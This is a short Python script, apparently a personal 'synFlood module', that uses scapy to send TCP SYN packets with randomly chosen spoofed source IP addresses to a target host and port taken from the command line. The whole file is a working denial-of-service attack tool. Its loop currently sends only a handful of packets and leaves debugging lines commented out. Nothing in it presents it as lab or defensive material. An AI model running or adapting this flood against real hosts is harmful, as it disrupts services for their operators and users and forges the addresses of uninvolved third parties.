#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#' synFlood module '

__author__ = 'Hongchao Du'

import sys
import random
import time
from scapy.all import *

def synFlood():
	args=sys.argv
	print(len(args))
	if len(args)==1:
		print('Need more arguments!')
		return 
	elif len(args)==3:
		tgt = args[1]
		dPort = args[2]
	srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
	t=int(round(time.time() * 1000))
	print(t)
	for sPort in range(11024,11030):
		tem=int(round(time.time() * 1000))
		index = random.randrange(4)
		ipLayer = IP(src=srcList[index], dst=tgt)
		tcpLayer = TCP(sport=sPort, dport=int(dPort),flags="S")
		packet = ipLayer / tcpLayer 
		#data = "Hello Scapy"
		#pkt = IP(src='172.16.2.135', dst='172.16.2.91')/UDP(sport=12345, dport=5555)/data		
		#print (int(round(time.time() * 1000)))
		send(packet)
		#while int(round(time.time() * 1000))-tem<0:
		#	x=0
	print (int(round(time.time() * 1000))-t)

if __name__=='__main__':
    synFlood()
